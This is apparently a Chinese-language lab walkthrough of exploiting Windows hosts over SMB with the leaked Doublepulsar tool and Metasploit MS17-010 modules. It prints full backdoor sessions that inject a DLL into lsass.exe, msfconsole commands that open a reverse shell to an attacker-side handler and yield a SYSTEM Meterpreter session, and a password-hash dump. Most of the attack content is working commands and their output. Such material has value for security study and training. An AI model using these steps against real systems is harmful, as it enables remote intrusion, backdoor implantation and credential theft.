### 优化后的文本

#### 配置网络参数
- 设置 `NetworkTimeout` 为 60 秒。
- 设置 `TargetIp` 为 172.19.2.16。

#### 应用会话参数
- 进入提示模式：Doublepulsar

**模块: Doublepulsar**

| 名称              | 值               |
|-----------------|----------------|
| NetworkTimeout  | 60             |
| TargetIp        | 172.19.2.16    |
| TargetPort      | 445            |
| OutputFile      |                |
| Protocol        | SMB            |
| Architecture    | x86            |
| Function        | OutputInstall  |

插件变量无效，是否提示设置变量？[是]：

- **NetworkTimeout**：阻塞网络调用的超时时间（秒）。使用 -1 表示无超时。
  - 输入 `NetworkTimeout` [默认 60]：
- **TargetIp**：目标 IP 地址。
  - 输入 `TargetIp` [默认 172.19.2.16]：
- **TargetPort**：Double Pulsar 后门使用的端口。
  - 输入 `TargetPort` [默认 445]：
- **Protocol**：后门使用的协议。
  - 0) SMB (TCP 445) Ring 0 后门
  - 1) RDP (TCP 3389) Ring 0 后门
  - 输入 `Protocol` [默认 0]：
- **Architecture**：目标操作系统的架构。
  - 0) x86 (32 位)
  - 1) x64 (64 位)
  - 输入 `Architecture` [默认 0]：
- **Function**：后门执行的操作。
  - 0) OutputInstall：仅将安装 shellcode 输出到磁盘文件
  - 1) Ping：测试后门是否存在
  - 2) RunDLL：使用 APC 将 DLL 注入用户模式进程
  - 3) RunShellcode：运行原始 shellcode
  - 4) Uninstall：从系统中移除后门
  - 输入 `Function` [默认 0]：
- **OutputFile**：输出文件的完整路径。
  - 输入 `OutputFile` [默认空]：outfile

设置 `OutputFile` 为 outfile。

准备执行 Doublepulsar。

- 禁用重定向
- 配置本地隧道
  - 本地隧道 - local-tunnel-1
  - 目标 IP [默认 172.19.2.16]：
  - 目标端口 [默认 445]：
  - (TCP) 本地 172.19.2.16:445
- 配置远程隧道
- 执行插件？[是]：
- 执行插件
- 选择协议 SMB
- 写入安装程序到磁盘
- 删除旧版本的 OutputFile 如果存在
- Shellcode 写入 OutputFile
- Doublepulsar 成功

#### 使用 Doublepulsar
进入插件上下文：Doublepulsar
- 应用全局变量
- 设置 `NetworkTimeout` 为 60 秒
- 设置 `TargetIp` 为 172.19.2.16
- 应用会话参数
- 函数：Deconflict
  - 索引 会话 ID 值
  - 0 Doublepulsar - 11
  - 1 Doublepulsar - 15
  - 2 Doublepulsar - 16
  - 3 当前值 RunDLL
  - 输入函数 [默认 0]：3
  - 使用当前值作为函数

进入提示模式：Doublepulsar

| 名称                  | 值               |
|---------------------|----------------|
| NetworkTimeout      | 60             |
| TargetIp            | 172.19.2.16    |
| TargetPort          | 445            |
| DllPayload          | D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll |
| DllOrdinal          | 1              |
| ProcessName         | lsass.exe      |
| ProcessCommandLine  |                |
| Protocol            | SMB            |
| Architecture        | x86            |
| Function            | RunDLL         |

插件变量有效，是否提示设置变量？[是]：
- 执行插件？[是]：
- 执行插件
- 选择协议 SMB
- 连接到目标...
- 连接到目标，ping 后门...
  - [-] 数据包 MID 为零，后门不存在
- 插件失败
- 错误：Doublepulsar 失败

手动执行 rundll32 PC_Level3.dll,rst32

使用 Doublepulsar
- 进入插件上下文：Doublepulsar
- 应用全局变量
- 设置 `NetworkTimeout` 为 60 秒
- 设置 `TargetIp` 为 172.19.2.16
- 应用会话参数
- 进入提示模式：Doublepulsar

| 名称              | 值               |
|-----------------|----------------|
| NetworkTimeout  | 60             |
| TargetIp        | 172.19.2.16    |
| TargetPort      | 445            |
| OutputFile      |                |
| Protocol        | SMB            |
| Architecture    | x86            |
| Function        | OutputInstall  |

插件变量无效，是否提示设置变量？[是]：
- **NetworkTimeout**：阻塞网络调用的超时时间（秒）。使用 -1 表示无超时。
  - 输入 `NetworkTimeout` [默认 60]：
- **TargetIp**：目标 IP 地址。
  - 输入 `TargetIp` [默认 172.19.2.16]：172.19.2.17
- 设置 `TargetIp` 为 172.19.2.17
- **TargetPort**：Double Pulsar 后门使用的端口。
  - 输入 `TargetPort` [默认 445]：
- **Protocol**：后门使用的协议。
  - 0) SMB (TCP 445) Ring 0 后门
  - 1) RDP (TCP 3389) Ring 0 后门
  - 输入 `Protocol` [默认 0]：
- **Architecture**：目标操作系统的架构。
  - 0) x86 (32 位)
  - 1) x64 (64 位)
  - 输入 `Architecture` [默认 0]：
- **Function**：后门执行的操作。
  - 0) OutputInstall：仅将安装 shellcode 输出到磁盘文件
  - 1) Ping：测试后门是否存在
  - 2) RunDLL：使用 APC 将 DLL 注入用户模式进程
  - 3) RunShellcode：运行原始 shellcode
  - 4) Uninstall：从系统中移除后门
  - 输入 `Function` [默认 0]：2
- 设置 `Function` 为 RunDLL
- **DllPayload**：要注入用户模式的 DLL。
  - 输入 `DllPayload` [默认空]：D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll
- 设置 `DllPayload` 为 D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll
- **DllOrdinal**：要调用的 DLL 导出序号。
  - 输入 `DllOrdinal` [默认 1]：
- **ProcessName**：要注入的进程名称。
  - 输入 `ProcessName` [默认 lsass.exe]：
- **ProcessCommandLine**：要注入的进程命令行。
  - 输入 `ProcessCommandLine` [默认空]：

准备执行 Doublepulsar。
- 禁用重定向
- 配置本地隧道
  - 本地隧道 - local-tunnel-1
  - 目标 IP [默认 172.19.2.17]：
  - 目标端口 [默认 445]：
  - (TCP) 本地 172.19.2.17:445
- 配置远程隧道
- 执行插件？[是]：
- 执行插件
- 选择协议 SMB
- 连接到目标...
- 连接到目标，ping 后门...
  - [+] 后门返回代码：10 - 成功！
  - [+] Ping 返回目标架构：x86 (32 位) - XOR Key: 0xF2A3472D
  - SMB 连接字符串是：Windows 7 Professional 7600
  - 目标操作系统是：7 x86
  - 目标 SP 是：0
  - [+] 后门已安装
  - [+] DLL 已构建
  - [.] 发送 shellcode 以注入 DLL
  - [+] 后门返回代码：10 - 成功！
  - [+] 命令完成成功
- Doublepulsar 成功

可以看出 msf 更加利落干净。
Eternalchampion 执行失败。需要进一步研究。

经过在网络搜索，发现 msf 中已经把这些 SMB 协议漏洞的利用整合到了 msf 中。我们来执行一下。

```bash
msfconsole 
use exploit/windows/smb/ms17_010_psexec 
set lhost 172.19.2.20 
set RHOSTS 172.19.2.16 
run 
```

```plaintext
[*] Started reverse TCP handler on 172.19.2.20:4444 
[*] 172.19.2.16:445 - Target OS: Windows 5.1 
[*] 172.19.2.16:445 - Filling barrel with fish... done 
[*] 172.19.2.16:445 -  
[*] 172.19.2.16:445 -   [*] Preparing dynamite... 
[*] 172.19.2.16:445 -           [*] Trying stick 1 (x86)...Boom! 
[*] 172.19.2.16:445 -   [+] Successfully Leaked Transaction! 
[*] 172.19.2.16:445 -   [+] Successfully caught Fish-in-a-barrel 
[*] 172.19.2.16:445 -  
[*] 172.19.2.16:445 - Reading from CONNECTION struct at: 0x80e2f880 
[*] 172.19.2.16:445 - Built a write-what-where primitive... 
[+] 172.19.2.16:445 - Overwrite complete... SYSTEM session obtained! 
[*] 172.19.2.16:445 - Selecting native target 
[*] 172.19.2.16:445 - Uploading payload... TsulsFkS.exe 
[*] 172.19.2.16:445 - Created \TsulsFkS.exe... 
[+] 172.19.2.16:445 - Service started successfully... 
[*] 172.19.2.16:445 - Deleting \TsulsFkS.exe... 
[*] Sending stage (175174 bytes) to 172.19.2.16 
[*] Meterpreter session 1 opened (172.19.2.20:4444 -> 172.19.2.16:1091 ) at 2022-04-09 21:56:53 -0400 
(Meterpreter 1)(C:\WINDOWS\system32) > getuid 
Server username: NT AUTHORITY\SYSTEM 
```

因为前面已经测试了 `ms17_010_psexec`，所以后面只测试 `ms17_010_eternalblue` 和 `smb_doublepulsar_rce`，看看 msf 的理解。访问 MS17010 EternalSynergy / EternalRomance / EternalChampion aux+exploit modules · Pull Request #9473 · rapid7/metasploit-framework (github.com) 这个提交记录说明具体的利用情况。

**Payload**
这些工具往往需要一个 Ticket，但是没有找到获取 Ticket 的方法。倒是可以利用 mimikatz 来获取 Ticket。然后使用这里的 Payload。这里的工具一类是直接下发负载，一类是提权工具。

下面利用 DSz 的工具进行 hashdump，然后利用 token 进行 ptt 等 NT 凭据利用操作。

```plaintext
#  Name                                      Disclosure Date  Rank     Check  Description 
-  ----                                      ---------------  ----     ---    ----------- 
0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes   MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 
1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 
2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 
3  auxiliary/scanner/smb/smb_ms17_010                         normal   No    MS17-010 SMB RCE Detection 
4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes   SMB DOUBLEPULSAR Remote Code Execution 

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce 
```

```plaintext
passworddump  
[03:30:10] ID: 542 'passworddump' started [target: z0.0.0.11] 
       User : Administrator 
        Rid : 500 
    Expired : false 
  Exception : false 
Lanman Hash : daa141f3639de015aad3b435b51404ee 
    Nt Hash : ad70819c5bc807280974d80f45982011 
------------------------------------------------------------------------ 
       User : ASPNET 
        Rid : 1006 
    Expired : false 
  Exception : false 
Lanman Hash : 28f84b2ddea413b7530046f0289088af 
    Nt Hash : fc4dcca97e3b926301f804e94dcd4338 
------------------------------------------------------------------------ 
       User : Guest 
        Rid : 501 
    Expired : false 
  Exception : false 
Lanman Hash : aad3b435b51404eeaad3b435b51404ee (Empty string) 
```